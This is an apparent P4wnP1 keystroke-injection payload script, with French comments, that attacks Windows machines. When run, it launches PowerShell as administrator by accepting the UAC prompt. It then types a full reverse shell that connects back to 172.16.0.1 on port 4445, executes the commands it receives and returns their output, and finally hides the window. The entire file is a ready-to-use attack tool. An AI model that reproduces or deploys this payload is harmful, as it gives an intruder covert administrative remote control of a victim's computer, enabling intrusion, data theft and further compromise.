// Reverse Shell FRv2 by INFINITION -> Lancer netcat -lvp 4445 sur P4wnP1
layout('us');			// USkeyboard layout
typingSpeed(0,0)        // FAST typingSpeed
press("GUI r")			// Run Command
delay(200)				// wait a little
type("powershell")			// call command
press("CTRL SHIFT ENTER")	// run as administrator
delay(1000)				// wait a little
press("SHIFT TAB")		// select Yes 
press("ENTER")			// validate
delay(3000)				// Booom in admin, now start typing reverseshell code
type("$client = New-Object System.Net.Sockets.TCPClient(")
press("3")				// current version of P4wnP1
type("172.16.0.1")      // ip of server (usb lan of P4wnP1)
press("3")
type(",4445)\n")        // listening port of server
type("$stream = $client.GetStream();[byte[]]$bytes = 0..65535")
press("RIGHT_ALT 6")
type("%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 ")
press("RIGHT_ALT 6")
type(" Out-String );$sendback2 = $sendback + ")
press("3")
type("PS ")
press("3")
type(" + (pwd).Path + ")
press("3")
type("> ")
press("3")
type(";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();exit\n")
// end of shellcode injection
press("GUI DOWN") 	// minimize windows in system tray
